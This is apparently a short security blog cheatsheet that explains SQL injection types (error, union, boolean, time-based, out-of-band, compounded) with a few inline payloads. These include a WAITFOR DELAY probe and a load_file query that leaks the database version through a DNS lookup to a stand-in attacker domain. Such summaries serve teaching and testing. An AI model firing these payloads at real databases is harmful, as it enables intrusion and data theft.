---
layout: post
title: "SQL Injection"
date: 2023-06-15
categories:
  - CHEATSHEET
tags:
  - SQLi
---

## In-Band SQLi (Error-Based SQLi and Union-Based SQLi)

* **Error-Based SQLi**: This technique involves performing actions that cause the SQL database to throw an error, which is helpful for an attacker to understand the structure of the database.
* **Union-Based SQLi**: This type of attack leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

  

## Blind/Inferential SQLi (Boolean-Based SQLi and Time-Based SQLi)  


* **Boolean-Based SQLi**: The attacker sends an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.
  * Example: Adjusting a statement to check a condition, such as `SELECT * FROM users WHERE username = 'admin' AND 1=1` (true) versus `1=2` (false).
* **Time-Based SQLi**: This attack involves modifying the database query so that its execution will take more time to complete, depending on a specified SQL statementâ€™s condition.
  * Example: `IF (1=1) WAITFOR DELAY '00:00:05'` - if the condition is true, the response will be delayed by 5 seconds, indicating a successful SQL injection.

  
## Out-of-Band SQLi  


This type of SQLi occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-Band techniques, which rely on the capacity of the server to make DNS or HTTP requests to transfer data to an attacker. 

**Example:** Triggering a DNS lookup to a server controlled by an attacker with a query like: `SELECT load_file(concat('\\\\',(SELECT @@version),'.example.com\\test'))`.

  
## Compounded SQLi (SQLi with XSS or SQLi with LFI)  


Attackers might use SQLi to inject malicious JavaScript, leading to stored XSS, or exploit SQLi to include files from the system (LFI). 

**Example:** Inserting a script tag into a database field that is later displayed in user browsers, or manipulating file paths stored in the database to execute or leak files from the server.


